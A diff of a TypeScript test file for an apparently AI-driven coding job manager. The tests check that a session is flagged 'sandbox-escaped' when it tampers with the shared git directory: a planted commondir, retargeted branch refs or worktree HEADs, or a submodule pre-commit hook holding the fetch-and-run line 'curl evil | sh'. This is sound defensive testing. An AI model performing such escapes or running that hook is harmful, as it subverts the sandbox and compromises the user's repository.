@@ -899,7 +899,19 @@ describe('copilot_run common git dir snapshot (a file-tool write swapped into th
     rmSync(join(git, 'worktrees', 'mine'));
   });
 
-  it('detects a planted commondir, a submodule hook and a moved branch; ignores job branches and packing refs', () => {
+  it('detects another worktree\'s repointed HEAD unless it is a live job\'s', () => {
+    const other = join(root, 'other-wt');
+    gitIn(repo, 'worktree', 'add', '-q', '-b', 'user-feature', other);
+    const id = readWorktreeGitLinks(other)!.adminDir.split(/[\\/]/).pop()!;
+    const before = sharedGitStateSnapshot(join(repo, '.git'));
+    expect(before[`worktrees/${id}/HEAD`]).toMatch(/^file /);
+    writeFileSync(join(repo, '.git', 'worktrees', id, 'HEAD'), 'ref: refs/heads/main\n');
+    const after = sharedGitStateSnapshot(join(repo, '.git'));
+    expect(sharedGitStateChanges(before, after)).toEqual([`worktrees/${id}/HEAD`]);
+    expect(sharedGitStateChanges(before, after, new Set([`worktrees/${id}/HEAD`]))).toEqual([]);
+  });
+
+  it('detects a planted commondir, a submodule hook, a moved branch and a new job branch; ignores packing refs', () => {
     const git = join(repo, '.git');
     mkdirSync(join(git, 'modules', 'sub', 'hooks'), { recursive: true });
     writeFileSync(join(git, 'modules', 'sub', 'config'), '[core]\n\tbare = false\n');
@@ -907,10 +919,10 @@ describe('copilot_run common git dir snapshot (a file-tool write swapped into th
     const before = sharedGitStateSnapshot(git);
     expect(before['refs/heads/main']).toMatch(/^ref [0-9a-f]{40}/);
 
-    // Packing refs, and job branches that concurrent jobs create and move, are no change.
+    // Packing refs is no change; a job branch created outside the manager (expectJobRef) is.
     gitIn(repo, 'pack-refs', '--all');
-    gitIn(repo, 'branch', 'omc-team/copilot-run/cr-other');
     expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual([]);
+    gitIn(repo, 'branch', 'omc-team/copilot-run/cr-other');
 
     writeFileSync(join(git, 'modules', 'sub', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
     writeFileSync(join(repo, 'b.txt'), 'b\n');
@@ -918,7 +930,77 @@ describe('copilot_run common git dir snapshot (a file-tool write swapped into th
     gitIn(repo, 'commit', '-q', '-m', 'moves main');
     // Last: a planted commondir points git itself elsewhere.
     writeFileSync(join(git, 'commondir'), `${join(root, 'evil')}\n`);
-    expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['commondir', 'modules/sub', 'refs/heads/main']);
+    expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['commondir', 'modules/sub', 'refs/heads/main', 'refs/heads/omc-team/copilot-run/cr-other']);
+  });
+
+  /** A commit on the job worktree's detached HEAD, as the session makes it. */
+  const laneCommit = (wt: string, name: string) => {
+    writeFileSync(join(wt, name), `${name}\n`);
+    gitIn(wt, 'add', name);
+    gitIn(wt, 'commit', '-q', '-m', name);
+    return gitIn(wt, 'rev-parse', 'HEAD');
+  };
+
+  it('a lane pointing its own branch at main (symref) fails as sandbox-escaped and main does not move', async () => {
+    const main = gitIn(repo, 'rev-parse', 'refs/heads/main');
+    const m = manager('hang');
+    const started = m.start({ prompt: 'implement', cwd: repo });
+    await new Promise((r) => setTimeout(r, 50));
+    const { path: wt, branch } = started.worktree as { path: string; branch: string };
+    laneCommit(wt, 'evil.txt');
+    // The file tool's write (raced into the git dir): the job's branch becomes `ref: refs/heads/main`.
+    writeFileSync(join(repo, '.git', 'refs', 'heads', ...branch.split('/')), 'ref: refs/heads/main\n');
+    const done = await m.cancel(started.jobId as string);
+    expect(done.status).toBe('failed');
+    expect(done.error).toMatch(new RegExp(`^sandbox-escaped: .*refs/heads/${branch}`));
+    expect(gitIn(repo, 'rev-parse', 'refs/heads/main')).toBe(main);
+  });
+
+  it('a running lane retargeting a finished job\'s branch or worktree HEAD fails as sandbox-escaped', async () => {
+    const m = manager('hang');
+    const first = m.start({ prompt: 'implement', cwd: repo });
+    expect((await m.cancel(first.jobId as string)).status).toBe('cancelled');
+    const { path: firstWt, branch: firstBranch } = first.worktree as { path: string; branch: string };
+    const firstSha = gitIn(repo, 'rev-parse', `refs/heads/${firstBranch}`);
+    const firstAdmin = readWorktreeGitLinks(firstWt)!.adminDir;
+
+    for (const target of ['branch', 'head'] as const) {
+      const started = m.start({ prompt: 'implement', cwd: repo });
+      await new Promise((r) => setTimeout(r, 50));
+      const evil = laneCommit((started.worktree as { path: string }).path, `evil-${target}.txt`);
+      if (target === 'branch') writeFileSync(join(repo, '.git', 'refs', 'heads', ...firstBranch.split('/')), `${evil}\n`);
+      else writeFileSync(join(firstAdmin, 'HEAD'), `${evil}\n`);
+      const done = await m.cancel(started.jobId as string);
+      expect(done.status).toBe('failed');
+      expect(done.error).toMatch(target === 'branch'
+        ? new RegExp(`^sandbox-escaped: the common git dir .*refs/heads/${firstBranch}`)
+        : /^sandbox-escaped: the common git dir .*worktrees\/[^/]+\/HEAD/);
+      // Put it back for the next round.
+      if (target === 'branch') writeFileSync(join(repo, '.git', 'refs', 'heads', ...firstBranch.split('/')), `${firstSha}\n`);
+      else writeFileSync(join(firstAdmin, 'HEAD'), `${firstSha}\n`);
+    }
+  });
+
+  it('concurrent jobs that commit and end in turn all pass, and cleanup meanwhile is no change', async () => {
+    const m = manager('hang');
+    const done = m.start({ prompt: 'implement', cwd: repo });
+    await m.cancel(done.jobId as string);
+    const a = m.start({ prompt: 'implement', cwd: repo });
+    const b = m.start({ prompt: 'implement', cwd: repo });
+    await new Promise((r) => setTimeout(r, 50));
+    const aHead = laneCommit((a.worktree as { path: string }).path, 'a.txt');
+    const bHead = laneCommit((b.worktree as { path: string }).path, 'b.txt');
+    const aDone = await m.cancel(a.jobId as string);
+    expect(aDone.error ?? '').not.toMatch(/sandbox-escaped/);
+    expect(gitIn(repo, 'rev-parse', `refs/heads/${(a.worktree as { branch: string }).branch}`)).toBe(aHead);
+    // A job started after a's end, and the first job's cleanup, while b runs.
+    const c = m.start({ prompt: 'implement', cwd: repo });
+    expect(m.cleanup(done.jobId as string).cleanup).toContain('removed worktree');
+    const bDone = await m.cancel(b.jobId as string);
+    expect(bDone.error ?? '').not.toMatch(/sandbox-escaped/);
+    expect(bDone.changes?.changedFiles).toEqual(['b.txt']);
+    expect(gitIn(repo, 'rev-parse', `refs/heads/${(b.worktree as { branch: string }).branch}`)).toBe(bHead);
+    expect((await m.cancel(c.jobId as string)).error ?? '').not.toMatch(/sandbox-escaped/);
   });
 });
 
